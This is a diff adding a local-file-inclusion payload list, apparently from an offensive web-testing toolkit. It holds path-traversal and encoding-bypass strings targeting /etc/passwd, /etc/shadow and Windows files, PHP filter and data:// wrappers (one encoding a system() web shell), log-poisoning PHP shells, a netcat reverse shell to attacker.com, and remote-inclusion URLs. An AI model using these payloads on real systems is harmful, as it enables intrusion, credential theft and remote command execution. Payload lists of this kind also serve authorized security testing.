@@ -1,0 +1,79 @@
+# LFI Payloads Collection
+# Accuracy: 90%
+
+# Basic LFI
+../../../../etc/passwd
+../../../../etc/passwd%00
+....//....//etc/passwd
+..///..///..///etc/passwd
+
+# Common Files
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/motd
+/etc/resolv.conf
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/etc/httpd/conf/httpd.conf
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/var/log/syslog
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/mounts
+
+# PHP Filters
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+
+# Wrappers
+expect://id
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+zip://path/to/file.zip%23file.txt
+
+# Windows Paths
+..\..\..\..\windows\win.ini
+..\..\..\..\windows\system32\drivers\etc\hosts
+C:\windows\win.ini
+C:\boot.ini
+
+# Bypass Filters
+....//....//etc/passwd
+..///..///..///etc/passwd
+/.\\./.\\./etc/passwd
+/..;/..;/etc/passwd
+
+# Null Byte
+../../../../etc/passwd%00
+../../../../etc/passwd%2500
+../../../../etc/passwd%00.jpg
+
+# Double Encoding
+..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%252fetc%252fpasswd
+
+# UTF-8 Bypass
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+
+# Path Traversal
+....//....//....//etc/passwd
+..///////..////..//////etc/passwd
+
+# Apache Log Poisoning
+<?php system($_GET['cmd']); ?>
+<?php exec('nc -e /bin/sh attacker.com 4444'); ?>
+
+# PHP Input
+php://input
+POST: <?php system('id'); ?>
+
+# RFI to LFI
+http://attacker.com/shell.txt?
+https://raw.githubusercontent.com/payload.txt?
